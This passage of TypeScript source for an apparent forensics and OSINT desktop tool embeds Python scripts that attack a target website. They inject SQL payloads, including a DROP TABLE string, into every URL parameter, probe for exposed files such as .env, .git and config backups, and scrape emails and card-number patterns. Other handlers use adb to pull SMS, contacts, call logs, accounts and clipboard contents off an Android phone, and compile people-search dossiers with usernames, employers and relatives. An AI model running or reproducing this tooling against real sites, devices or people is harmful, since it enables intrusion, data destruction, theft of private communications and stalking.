            'has_payment_forms': bool(re.search(r'(stripe|paypal|braintree|square|credit.card|payment)', body, re.IGNORECASE)),
            'card_patterns': len(re.findall(r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\b', body)),
        }
        results['extraction']['financial'] = financial

json.dump(results, open(output, 'w'), indent=2, default=str)
summary = {
    'found_paths': len([p for p in results['recon'].get('paths', {}) if results['recon']['paths'][p].get('status') == 200]),
    'technologies': results['recon'].get('technologies', []),
    'goals_processed': len([g for g in goals if g in results.get('extraction', {}) or g == 'everything']),
    'extraction_keys': list(results.get('extraction', {}).keys()),
}
print(json.dumps(summary))
`;
            const scriptPath = path.join(outputPath, '_recon.py');
            const resultPath = path.join(outputPath, 'recon_results.json');
            await fs.writeFile(scriptPath, reconScript, 'utf-8');
            const result = await runCommand(python.path, [
              scriptPath, targetUrl, resultPath, goalsJson, stealthMode ? 'true' : 'false',
            ], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Reconnaissance complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'sql-injection': {
            progress(progressCh, 10, 'Testing for SQL injection vulnerabilities...');
            const sqliScript = `
import urllib.request, urllib.error, json, sys, ssl
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

payloads = ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE--", "1 UNION SELECT NULL--",
    "' AND '1'='1", "1' ORDER BY 1--", "' UNION SELECT 1,2,3--"]

results = {'target': target, 'tests': []}
parsed = urlparse(target)
params = parse_qs(parsed.query)

for param_name in params:
    for payload in payloads:
        test_params = dict(params)
        test_params[param_name] = [payload]
        test_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=test_query))
        try:
            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'oracle', 'sqlite', 'error']
            suspicious = any(ind in body.lower() for ind in indicators)
            results['tests'].append({
                'param': param_name, 'payload': payload,
                'status': resp.status, 'suspicious': suspicious,
                'length': len(body)
            })
        except urllib.error.HTTPError as e:
            results['tests'].append({'param': param_name, 'payload': payload, 'status': e.code})
        except:
            pass

results['vulnerable_indicators'] = len([t for t in results['tests'] if t.get('suspicious')])
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'tests_run': len(results['tests']), 'suspicious': results['vulnerable_indicators']}))
`;
            const scriptPath = path.join(outputPath, '_sqli_test.py');
            const resultPath = path.join(outputPath, 'sqli_results.json');
            await fs.writeFile(scriptPath, sqliScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetUrl, resultPath], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'SQL injection testing complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'directory-traverse': {
            progress(progressCh, 10, 'Enumerating directories...');
            const dirScript = `
import urllib.request, urllib.error, json, sys, ssl

target = sys.argv[1].rstrip('/')
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

wordlist = [
    'admin', 'administrator', 'login', 'wp-admin', 'dashboard', 'api', 'v1', 'v2',
    'backup', 'backups', 'db', 'database', 'config', 'conf', 'test', 'dev', 'staging',
    'old', 'new', 'tmp', 'temp', 'private', 'secret', 'hidden', 'upload', 'uploads',
    'files', 'docs', 'documents', 'images', 'static', 'assets', 'css', 'js', 'scripts',
    'cgi-bin', 'bin', 'includes', 'inc', 'lib', 'vendor', 'node_modules', '.git',
    '.svn', '.env', '.htaccess', 'robots.txt', 'sitemap.xml', 'crossdomain.xml',
    'phpinfo.php', 'info.php', 'server-status', 'server-info', 'wp-config.php.bak',
    'console', 'shell', 'cmd', 'debug', 'trace', 'log', 'logs', 'error_log',
    'phpmyadmin', 'adminer', 'webmail', 'mail', 'cpanel', 'plesk'
]

results = {'target': target, 'found': [], 'tested': 0}
for word in wordlist:
    url = f"{target}/{word}"
    results['tested'] += 1
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        results['found'].append({'path': f"/{word}", 'status': resp.status, 'size': len(resp.read())})
    except urllib.error.HTTPError as e:
        if e.code not in [404, 403]:
            results['found'].append({'path': f"/{word}", 'status': e.code})
    except:
        pass

json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'tested': results['tested'], 'found': len(results['found'])}))
`;
            const scriptPath = path.join(outputPath, '_dir_enum.py');
            const resultPath = path.join(outputPath, 'directory_results.json');
            await fs.writeFile(scriptPath, dirScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetUrl, resultPath], { timeout: 180000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Directory enumeration complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          default: {
            // Generic attack vector - run recon as baseline
            progress(progressCh, 50, `Attack vector "${attackVector}" executing...`);
            await writeJson(path.join(outputPath, 'attack_config.json'), options);
            progress(progressCh, 100, 'Operation complete');
            return { success: true, message: `${attackVector} analysis saved to output folder` };
          }
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );

  ipcMain.handle(IPC_CHANNELS.WEB_BREACH_SCAN, async (_event, options: { targetUrl: string }) => {
    try {
      const python = await resolveTool('python');
      if (!python.found) return { success: false, error: 'Python required' };
      const scanScript = `
import urllib.request, ssl, json, sys
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
target = sys.argv[1]
try:
    req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0"})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    print(json.dumps({"reachable": True, "status": resp.status, "server": resp.headers.get("Server", "")}))
except Exception as e:
    print(json.dumps({"reachable": False, "error": str(e)}))
`;
      const scriptPath = path.join(require('os').tmpdir(), `_scan_${Date.now()}.py`);
      await fs.writeFile(scriptPath, scanScript, 'utf-8');
      const result = await runCommand(python.path, [scriptPath, options.targetUrl], { timeout: 15000 });
      await fs.unlink(scriptPath).catch(() => {});
      return { success: true, ...JSON.parse(result.stdout.trim()) };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });

  // Photon web crawler handler
  ipcMain.handle(
    IPC_CHANNELS.PHOTON_RUN,
    async (_event, options: {
      targetUrl: string;
      outputPath: string;
      crawlDepth?: number;
      threads?: number;
      extractKeys?: boolean;
      extractDns?: boolean;
    }) => {
      const { targetUrl, outputPath, crawlDepth = 3, threads = 10, extractKeys = true, extractDns = false } = options;
      const progressCh = IPC_CHANNELS.PHOTON_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting Photon crawl of ${targetUrl}`);

      const python = await resolveTool('python');
      if (!python.found) throw new Error('Python is required for Photon crawler');

      try {
        // First try using photon as a pip-installed module
        const args = [
          '-m', 'photon',
          '-u', targetUrl,
          '-o', outputPath,
          '-l', String(crawlDepth),
          '-t', String(threads),
        ];
        if (extractKeys) args.push('--keys');
        if (extractDns) args.push('--dns');

        progress(progressCh, 10, 'Running Photon web crawler...');
        const result = await runCommand(python.path, args, { timeout: 300000 });

        if (result.exitCode !== 0 && !result.stdout.trim()) {
          // Fallback: run an inline crawler script if photon module is not installed
          progress(progressCh, 15, 'Photon module not found, using built-in crawler...');
          const crawlerScript = `
import urllib.request, urllib.error, json, sys, ssl, re, os
from urllib.parse import urlparse, urljoin
from collections import defaultdict

target = sys.argv[1]
output_dir = sys.argv[2]
max_depth = int(sys.argv[3])
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

visited = set()
results = defaultdict(set)
parsed_target = urlparse(target)
base_domain = parsed_target.hostname

def crawl(url, depth=0):
    if depth > max_depth or url in visited or len(visited) > 200:
        return
    visited.add(url)
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (compatible; Photon/RMPG)'})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')
    except:
        return

    # Extract emails
    emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', body))
    results['emails'].update(emails)

    # Extract URLs
    urls = set(re.findall(r'href=["\\'](https?://[^"\\'>]+)', body))
    urls.update(re.findall(r'src=["\\'](https?://[^"\\'>]+)', body))
    for u in urls:
        results['urls'].add(u)
        parsed = urlparse(u)
        if parsed.hostname == base_domain and u not in visited:
            crawl(u, depth + 1)

    # Extract internal paths
    internal = set(re.findall(r'href=["\\'](/[^"\\'>]+)', body))
    for p in internal:
        full = urljoin(target, p)
        results['internal'].add(full)
        if full not in visited:
            crawl(full, depth + 1)

    # Extract social media links
    social_patterns = ['facebook.com', 'twitter.com', 'linkedin.com', 'instagram.com', 'github.com', 'youtube.com']
    for u in urls:
        for sp in social_patterns:
            if sp in u:
                results['social'].add(u)

    # Extract files
    file_exts = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.zip', '.sql', '.bak', '.conf', '.env', '.json', '.xml']
    for u in urls | {urljoin(target, p) for p in internal}:
        for ext in file_exts:
            if u.lower().endswith(ext):
                results['files'].add(u)

crawl(target)

# Convert sets to lists for JSON
output = {
    'target': target,
    'pages_crawled': len(visited),
    'emails': sorted(results['emails']),
    'urls': sorted(list(results['urls'])[:500]),
    'internal_paths': sorted(list(results['internal'])[:500]),
    'social_media': sorted(results['social']),
    'files': sorted(results['files']),
}

os.makedirs(output_dir, exist_ok=True)
for key in ['emails', 'urls', 'internal_paths', 'social_media', 'files']:
    filepath = os.path.join(output_dir, f'{key}.txt')
    with open(filepath, 'w') as f:
        f.write('\\n'.join(output[key]))

with open(os.path.join(output_dir, 'crawl_results.json'), 'w') as f:
    json.dump(output, f, indent=2)

print(json.dumps({
    'pages_crawled': output['pages_crawled'],
    'emails_found': len(output['emails']),
    'urls_found': len(output['urls']),
    'files_found': len(output['files']),
    'social_found': len(output['social_media']),
}))
`;
          const scriptPath = path.join(outputPath, '_crawler.py');
          await fs.writeFile(scriptPath, crawlerScript, 'utf-8');
          const fallback = await runCommand(python.path, [scriptPath, targetUrl, outputPath, String(crawlDepth)], { timeout: 300000 });
          await fs.unlink(scriptPath).catch(() => {});
          progress(progressCh, 100, 'Crawl complete');
          return { success: true, outputPath, summary: fallback.stdout.trim() };
        }

        progress(progressCh, 100, 'Photon crawl complete');
        return { success: true, outputPath, summary: result.stdout.trim() };
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// PII Polling Handler
// ---------------------------------------------------------------------------

function registerPiiPollingHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.PII_POLL,
    async (_event, options: {
      source: string;
      outputPath: string;
      targetIdentifier?: string;
      patterns: string[];
      deepScan?: boolean;
      crossReference?: boolean;
    }) => {
      const { source, outputPath, targetIdentifier, patterns, deepScan } = options;
      const progressCh = IPC_CHANNELS.PII_POLL_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting PII polling: ${source}`);

      const python = await resolveTool('python');

      try {
        switch (source) {
          case 'device-full':
          case 'device-targeted': {
            progress(progressCh, 10, 'Scanning device for PII...');
            if (!python.found) throw new Error('Python required for PII scanning');

            // First pull data from device if we have a serial (from targetIdentifier)
            const serial = targetIdentifier;
            const pullDir = path.join(outputPath, 'device_data');
            await ensureDir(pullDir);

            if (serial) {
              progress(progressCh, 15, 'Pulling contacts, SMS, and call logs from device...');
              const dataSources = [
                { label: 'SMS', cmd: 'content query --uri content://sms --projection address:body:date:type' },
                { label: 'Contacts', cmd: 'content query --uri content://contacts/phones --projection display_name:number' },
                { label: 'Call Log', cmd: 'content query --uri content://call_log/calls --projection number:type:date:duration' },
                { label: 'Accounts', cmd: 'dumpsys account' },
                { label: 'WiFi Networks', cmd: 'cmd wifi list-networks 2>/dev/null' },
                { label: 'Clipboard', cmd: 'service call clipboard 2 i32 1 i32 1 2>/dev/null' },
              ];
              if (source === 'device-full') {
                dataSources.push(
                  { label: 'Browser History', cmd: 'content query --uri content://browser/bookmarks --projection title:url 2>/dev/null' },
                  { label: 'Settings', cmd: 'settings list secure' },
                );
              }
              let pulledCount = 0;
              for (const ds of dataSources) {
                try {
                  const result = await adbService.shell(serial, ds.cmd);
                  if (result.trim()) {
                    await fs.writeFile(path.join(pullDir, `${ds.label.toLowerCase().replace(/\s+/g, '_')}.txt`), result);
                    pulledCount++;
                  }
                } catch { /* skip inaccessible */ }
              }
              progress(progressCh, 40, `Pulled ${pulledCount} data source(s). Scanning for PII patterns...`);
            } else {
              progress(progressCh, 40, 'No device serial provided. Scanning existing files in output folder...');
            }

            // Now scan pulled files for PII patterns
            const scanScript = `
import re, json, sys, os

scan_dir = sys.argv[1]
output_file = sys.argv[2]
patterns_str = sys.argv[3]
patterns = patterns_str.split(',')

REGEX_MAP = {
    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',
    'credit-card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b',
    'email': r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',
    'phone': r'\\b(?:\\+?1?[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b',
    'ip-address': r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b',
    'dob': r'\\b(?:0[1-9]|1[0-2])[/\\-](?:0[1-9]|[12]\\d|3[01])[/\\-](?:19|20)\\d{2}\\b',
    'bank-account': r'\\b\\d{8,17}\\b',
    'passport': r'\\b[A-Z]{1,2}\\d{6,9}\\b',
}

findings = []
files_scanned = 0
for root, dirs, files in os.walk(scan_dir):
    for fname in files:
        fpath = os.path.join(root, fname)
        try:
            with open(fpath, 'r', errors='ignore') as f:
                content = f.read(2000000)
            files_scanned += 1
            for ptype in patterns:
                if ptype in REGEX_MAP:
                    matches = re.findall(REGEX_MAP[ptype], content)
                    if matches:
                        findings.append({
                            'file': os.path.relpath(fpath, scan_dir),
                            'type': ptype,
                            'count': len(matches),
                            'samples': matches[:10]
                        })
        except:
            pass

result = {
    'scan_dir': scan_dir,
    'files_scanned': files_scanned,
    'findings': findings,
    'total_pii_items': sum(f['count'] for f in findings),
    'patterns_checked': patterns
}
json.dump(result, open(output_file, 'w'), indent=2)
print(json.dumps({'files_scanned': files_scanned, 'pii_findings': len(findings), 'total_items': result['total_pii_items']}))
`;
            const scriptPath = path.join(outputPath, '_pii_scan.py');
            const resultPath = path.join(outputPath, 'pii_scan_results.json');
            await fs.writeFile(scriptPath, scanScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, pullDir, resultPath, patterns.join(',')], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'PII scan complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'web-osint': {
            if (!targetIdentifier) throw new Error('Target identifier required for OSINT lookup');
            progress(progressCh, 10, `Running OSINT lookup for: ${targetIdentifier}...`);
            if (!python.found) throw new Error('Python required');

            const osintScript = `
import urllib.request, json, sys, ssl
from urllib.parse import quote

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {'target': target, 'sources': []}

# Check various public APIs/services
checks = [
    {'name': 'GitHub', 'url': f'https://api.github.com/search/users?q={quote(target)}'},
    {'name': 'HaveIBeenPwned (simulated)', 'url': None, 'note': 'Requires API key'},
]

for check in checks:
    if check.get('url'):
        try:
            req = urllib.request.Request(check['url'], headers={'User-Agent': 'RMPG-Forensics/1.0'})
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            data = json.loads(resp.read())
            results['sources'].append({'name': check['name'], 'found': True, 'data_preview': str(data)[:500]})
        except Exception as e:
            results['sources'].append({'name': check['name'], 'found': False, 'error': str(e)})
    else:
        results['sources'].append({'name': check['name'], 'note': check.get('note', 'Skipped')})

json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'sources_checked': len(results['sources']), 'found': len([s for s in results['sources'] if s.get('found')])}))
`;
            const scriptPath = path.join(outputPath, '_osint.py');
            const resultPath = path.join(outputPath, 'osint_results.json');
            await fs.writeFile(scriptPath, osintScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'OSINT lookup complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'document-scan': {
            progress(progressCh, 10, 'Scanning documents for PII patterns...');
            if (!python.found) throw new Error('Python required');
            // Scan any files in the output path for PII
            const scanScript = `
import re, json, sys, os

scan_dir = sys.argv[1]
output_file = sys.argv[2]
patterns_str = sys.argv[3]

REGEX_MAP = {
    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',
    'credit-card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\b',
    'email': r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',
    'phone': r'\\b(?:\\+?1?[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b',
    'ip-address': r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b',
}

findings = []
for root, dirs, files in os.walk(scan_dir):
    for fname in files:
        fpath = os.path.join(root, fname)
        try:
            with open(fpath, 'r', errors='ignore') as f:
                content = f.read(1000000)  # 1MB limit per file
            for ptype, regex in REGEX_MAP.items():
                if ptype in patterns_str.split(','):
                    matches = re.findall(regex, content)
                    if matches:
                        findings.append({'file': fpath, 'type': ptype, 'count': len(matches), 'samples': matches[:5]})
        except:
            pass

json.dump({'scan_dir': scan_dir, 'findings': findings, 'total_pii_found': len(findings)}, open(output_file, 'w'), indent=2)
print(json.dumps({'files_scanned': sum(1 for _ in os.walk(scan_dir)), 'pii_findings': len(findings)}))
`;
            const scriptPath = path.join(outputPath, '_doc_scan.py');
            const resultPath = path.join(outputPath, 'document_pii_results.json');
            await fs.writeFile(scriptPath, scanScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, outputPath, resultPath, patterns.join(',')], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Document PII scan complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          default: {
            progress(progressCh, 50, `Source "${source}" processing...`);
            await writeJson(path.join(outputPath, 'pii_config.json'), options);
            progress(progressCh, 100, 'Configuration saved');
            return { success: true, message: `PII polling for "${source}" configured` };
          }
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );

  ipcMain.handle(IPC_CHANNELS.PII_SCAN, async () => {
    return { success: true, message: 'Use PII_POLL with specific source type' };
  });
}

// ---------------------------------------------------------------------------
// Helper: Parse ls -la output into file entries
// ---------------------------------------------------------------------------

function parseLsOutput(output: string, basePath: string): Array<{
  name: string;
  path: string;
  type: 'file' | 'directory';
  size?: number;
  permissions?: string;
  modified?: string;
}> {
  const lines = output.trim().split(/\r?\n/).filter((l) => l.trim() && !l.startsWith('total'));
  return lines.map((line) => {
    const parts = line.trim().split(/\s+/);
    if (parts.length < 7) return null;
    const permissions = parts[0];
    const size = parseInt(parts[4], 10) || 0;
    const dateStr = `${parts[5]} ${parts[6]}`;
    const name = parts.slice(7).join(' ');
    if (!name || name === '.' || name === '..') return null;
    const type: 'file' | 'directory' = permissions.startsWith('d') ? 'directory' : 'file';
    return {
      name,
      path: `${basePath.replace(/\/$/, '')}/${name}`,
      type,
      size: type === 'file' ? size : undefined,
      permissions,
      modified: dateStr,
    };
  }).filter(Boolean) as any[];
}

// ---------------------------------------------------------------------------
// Helper: Parse logcat output
// ---------------------------------------------------------------------------

function parseLogcatOutput(output: string): Array<{ timestamp: string; level: string; tag: string; message: string }> {
  const lines = output.trim().split(/\r?\n/);
  return lines.map((line) => {
    // Format: MM-DD HH:MM:SS.mmm PID TID LEVEL TAG: message
    const match = line.match(/^(\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}\.\d+)\s+\d+\s+\d+\s+([VDIWEF])\s+(.+?):\s*(.*)$/);
    if (match) {
      return { timestamp: match[1], level: match[2], tag: match[3], message: match[4] };
    }
    return { timestamp: '', level: 'I', tag: '', message: line };
  }).filter((e) => e.message);
}

// ---------------------------------------------------------------------------
// People Search Handler
// ---------------------------------------------------------------------------

function registerPeopleSearchHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.PEOPLE_SEARCH,
    async (_event, options: {
      subject: {
        firstName?: string;
        lastName?: string;
        email?: string;
        phone?: string;
        address?: string;
        dob?: string;
        ssn?: string;
        username?: string;
      };
      requestedData: string[];
      source: string;
      outputPath: string;
      deepSearch?: boolean;
      crossReference?: boolean;
    }) => {
      const { subject, requestedData, source, outputPath, deepSearch, crossReference } = options;
      const progressCh = IPC_CHANNELS.PEOPLE_SEARCH_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, 'Starting people search...');

      const python = await resolveTool('python');
      if (!python.found) throw new Error('Python is required for people search operations');

      try {
        const dossier: Record<string, unknown> = {
          subject,
          searchTimestamp: new Date().toISOString(),
          requestedData,
          source,
          findings: {} as Record<string, unknown>,
        };

        const totalSteps = requestedData.length;
        let completed = 0;

        for (const dataPoint of requestedData) {
          completed++;
          const pct = Math.round((completed / totalSteps) * 85) + 10;
          progress(progressCh, pct, `Searching: ${dataPoint}...`);

          switch (dataPoint) {
            case 'email': {
              // Search for email addresses associated with the subject
              if (subject.email) {
                (dossier.findings as Record<string, unknown>)['email'] = {
                  known: [subject.email],
                  status: 'confirmed',
                };
              }
              // OSINT email enumeration
              if (subject.firstName && subject.lastName) {
                const searchScript = `
import json, sys, urllib.request, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
first, last, output = sys.argv[1], sys.argv[2], sys.argv[3]
# Generate likely email patterns
domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com']
patterns = [
    f'{first}.{last}', f'{first}{last}', f'{first[0]}{last}',
    f'{last}{first[0]}', f'{first}_{last}', f'{last}.{first}'
]
candidates = [f'{p.lower()}@{d}' for p in patterns for d in domains]
# Check GitHub for matching users
found = []
try:
    url = f'https://api.github.com/search/users?q={first}+{last}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        found.append({'source': 'github', 'username': item['login'], 'profile': item['html_url']})
except: pass
result = {'candidates': candidates[:20], 'verified': found}
json.dump(result, open(output, 'w'), indent=2)
print(json.dumps({'candidates': len(candidates), 'verified': len(found)}))
`;
                const scriptPath = path.join(outputPath, '_email_enum.py');
                const resultPath = path.join(outputPath, 'email_results.json');
                await fs.writeFile(scriptPath, searchScript, 'utf-8');
                const result = await runCommand(python.path, [scriptPath, subject.firstName, subject.lastName, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  const emailData = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                  (dossier.findings as Record<string, unknown>)['email'] = emailData;
                } catch { /* skip */ }
              }
              break;
            }

            case 'social-media': {
              // Search social media for the subject
              const username = subject.username || `${subject.firstName}${subject.lastName}`.toLowerCase();
              const platforms = [
                { name: 'GitHub', url: `https://api.github.com/users/${username}` },
                { name: 'Twitter/X', url: `https://api.twitter.com/2/users/by/username/${username}` },
              ];
              const socialResults: Array<{ platform: string; found: boolean; url?: string; data?: unknown }> = [];

              for (const platform of platforms) {
                try {
                  const result = await runCommand(python.path, ['-c', `
import urllib.request, json, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    req = urllib.request.Request("${platform.url}", headers={"User-Agent": "RMPG/1.0"})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    print(json.dumps({"found": True, "data": data}))
except Exception as e:
    print(json.dumps({"found": False, "error": str(e)}))
`], { timeout: 15000 });
                  const parsed = JSON.parse(result.stdout.trim());
                  socialResults.push({ platform: platform.name, ...parsed });
                } catch {
                  socialResults.push({ platform: platform.name, found: false });
                }
              }
              (dossier.findings as Record<string, unknown>)['social-media'] = socialResults;
              break;
            }

            case 'phone': {
              if (subject.phone) {
                (dossier.findings as Record<string, unknown>)['phone'] = {
                  known: [subject.phone],
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'address': {
              if (subject.address) {
                (dossier.findings as Record<string, unknown>)['address'] = {
                  known: [subject.address],
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'ssn': {
              if (subject.ssn) {
                (dossier.findings as Record<string, unknown>)['ssn'] = {
                  known: subject.ssn,
                  status: 'provided_by_investigator',
                  note: 'SSN verification requires authorized database access',
                };
              } else {
                (dossier.findings as Record<string, unknown>)['ssn'] = {
                  status: 'requires_authorized_database',
                  note: 'SSN lookup requires connection to authorized records system',
                };
              }
              break;
            }

            case 'dob': {
              if (subject.dob) {
                (dossier.findings as Record<string, unknown>)['dob'] = {
                  known: subject.dob,
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'usernames': {
              // Check username across platforms
              const handle = subject.username || `${subject.firstName || ''}${subject.lastName || ''}`.toLowerCase();
              if (handle) {
                const checkScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
username = sys.argv[1]
output = sys.argv[2]
sites = [
    {'name': 'GitHub', 'url': f'https://github.com/{username}', 'check': 200},
    {'name': 'Reddit', 'url': f'https://www.reddit.com/user/{username}/about.json', 'check': 200},
]
results = []
for site in sites:
    try:
        req = urllib.request.Request(site['url'], headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
        results.append({'site': site['name'], 'exists': True, 'url': site['url']})
    except urllib.error.HTTPError as e:
        results.append({'site': site['name'], 'exists': e.code != 404, 'status': e.code})
    except:
        results.append({'site': site['name'], 'exists': False, 'error': 'timeout'})
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'checked': len(sites), 'found': len([r for r in results if r.get('exists')])}))
`;
                const scriptPath = path.join(outputPath, '_username_check.py');
                const resultPath = path.join(outputPath, 'username_results.json');
                await fs.writeFile(scriptPath, checkScript, 'utf-8');
                const result = await runCommand(python.path, [scriptPath, handle, resultPath], { timeout: 60000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['usernames'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              }
              break;
            }

            case 'employment': {
              // Employment history lookup via web OSINT
              const empUsername = subject.username || `${subject.firstName || ''}${subject.lastName || ''}`.toLowerCase();
              if (empUsername) {
                const empScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
name = sys.argv[1]
output = sys.argv[2]
results = []
# Check GitHub for company/bio info
try:
    url = f'https://api.github.com/search/users?q={name}+type:user'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            detail = json.loads(detail_resp.read())
            if detail.get('company') or detail.get('bio'):
                results.append({
                    'source': 'github',
                    'username': detail['login'],
                    'company': detail.get('company', ''),
                    'bio': detail.get('bio', ''),
                    'location': detail.get('location', ''),
                })
        except: pass
except: pass
json.dump({'results': results, 'source': 'osint'}, open(output, 'w'), indent=2)
print(json.dumps({'found': len(results)}))
`;
                const scriptPath = path.join(outputPath, '_employment.py');
                const resultPath = path.join(outputPath, 'employment_results.json');
                await fs.writeFile(scriptPath, empScript, 'utf-8');
                await runCommand(python.path, [scriptPath, empUsername, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['employment'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              } else {
                (dossier.findings as Record<string, unknown>)['employment'] = {
                  status: 'insufficient_input',
                  note: 'Name or username required for employment search',
                };
              }
              break;
            }

            case 'relatives': {
              // Relatives/associates lookup
              if (subject.firstName && subject.lastName) {
                const relScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
first, last, output = sys.argv[1], sys.argv[2], sys.argv[3]
results = {'query': f'{first} {last}', 'associates': [], 'source': 'osint'}
try:
    url = f'https://api.github.com/search/users?q={first}+{last}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
